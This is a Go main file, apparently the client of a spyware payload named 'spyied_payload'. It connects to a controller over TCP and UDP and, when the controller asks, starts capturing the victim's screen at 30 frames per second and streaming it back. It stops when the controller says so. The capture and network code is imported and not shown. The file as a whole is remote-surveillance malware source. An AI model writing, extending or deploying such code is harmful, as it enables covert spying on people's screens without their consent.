package main

import (
	"fmt"
	"spyied_payload/network"
	"spyied_payload/service/screen"
)

func main() {
	fmt.Println("This is a legendary beginning of a new Payload")
	network.InitUDPClient("127.0.0.1", 11000)
	client := network.NewTCPClient()

	var ssConf = screen.Config{
		TargetFPS:      30,
		DisplayIndex:   0,
		NetworkEnabled: true,
		BlockSize:      16,
	}

	var capturer *screen.Capturer

	client.SetMessageHandler(func(msgType network.MSGType, payload interface{}) {
		switch msgType {
		case network.MSGTypeScreen:
			if screenMsg, ok := payload.(network.ScreenMSG); ok {
				fmt.Printf("To Present: %v | Quality %v\n", screenMsg.ToPresent, screenMsg.DesiredQuality)
				if !screenMsg.ToPresent {
					capturer.Stop()
					return
				}

				capturer = screen.InitCapturer(&ssConf)
				go capturer.CaptureLoop()
			}
		}
	})

	cerr := client.Connect("127.0.0.1", 12000)
	if cerr != nil {
		panic(cerr)
	}

	select {}
}
